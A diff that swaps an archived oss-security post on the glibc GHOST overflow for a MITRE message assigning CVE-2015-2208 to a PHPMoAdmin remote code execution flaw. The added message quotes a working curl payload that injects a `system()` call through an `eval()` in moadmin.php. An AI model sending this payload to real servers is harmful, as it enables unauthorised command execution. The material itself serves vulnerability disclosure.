@@ -1,40 +1,40 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/29/8
-Message-ID: <54C9F7E2.5020302@redhat.com>
-Date: Thu, 29 Jan 2015 02:05:38 -0700
-From: Kurt Seifried <kseifried@...hat.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: GHOST gethostbyname() heap overflow in glibc (CVE-2015-0235)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/03/04/5
+Message-Id: <20150304093144.7D1C96C000A@smtpvmsrv1.mitre.org>
+Date: Wed,  4 Mar 2015 04:31:44 -0500 (EST)
+From: cve-assign@...re.org
+To: henri@...v.fi
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
+Subject: Re: CVE request: PHPMoAdmin Unauthorized Remote Code Execution
 Content-Type: text/plain; charset=utf-8
 
-On 29/01/15 01:16 AM, Sven Kieske wrote:
-> On 29/01/15 07:20, Paul Pluzhnikov wrote:
->> If I was supposed to cry alarm, I would have to cry alarm every time
->> there is a buffer overflow in glibc, which doesn't seem very useful.
-> 
-> Well as someone who is very careful, I _would_ consider every buffer
-> overflow a security risk unless proven otherwise.
-> 
-> It's unexpected behaviour, isn't it?
-> It's up to the surrounding systems such as ASLR to mitigate it.
-> But neither is ASLR deployed everywhere, nor is it a silver bullet
-> to solve the problem.
-> 
-> But I don't want to really reiterate this discussion.
-> All possible opinions on this topic have already been stated.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-So you'll be doing the work to confirm which ones are/are not, patch
-them, regression test the patches and so on? Awesome!
+> Can you assign 2015 CVE identifier for unauthorized remote code execution
+> vulnerability in PHPMoAdmin <http://www.phpmoadmin.com/>
 
-There's a reason we don't treat every potential security flaw as a
-security vulnerability. We have finite resources and pretty much an
-infinite number of flaws to deal with. Until you solve that problem we
-have to make due with "best effort", letting perfection be the enemy of
-good will kill us.
+> curl "http://example.com/moadmin.php"; -d "object=1;system('id');exit"
 
--- 
-Kurt Seifried -- Red Hat -- Product Security -- Cloud
-PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+> http://seclists.org/fulldisclosure/2015/Mar/19
 
+> 693:    eval('$obj=' . $obj . ';'); //cast from string to array
 
-Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
+Use CVE-2015-2208.
+
+- -- 
+CVE assignment team, MITRE CVE Numbering Authority
+M/S M300
+202 Burlington Road, Bedford, MA 01730 USA
+[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.14 (SunOS)
+
+iQEcBAEBAgAGBQJU9tCnAAoJEKllVAevmvmsA+oH/A1WfaSkqOcFeboeuhy1nhPS
+AwbQrbTIocKxnvLTuG4EbD61zkaFI7hND63BLGEih4GIaI1xlf9X3EL8EmYPSoY8
+U8VKpEtJAVQzFWHYobxdKu71WHBGjM0GpF4ckH3XacbkVsluJRoh3BnwCrMZatjn
+DI21LBR7tN01x2zqxIEqtVrNsv8ml9P2TLIMlTfMcVTnfCEtrmrcTx+TrWUbHofO
+aHBvUOy85Dmm0SQXn3E9z1Nfa7IkpwthrlAANfUp04X15uVV5bbSlv+zjVD9XAtu
+UPVYa98JZiZgKp5q7Q/8udG8carcs6uwOmjHqySVxPeVjXWArSDGD1KZhCqVH9k=
+=o9Yr
+-----END PGP SIGNATURE-----
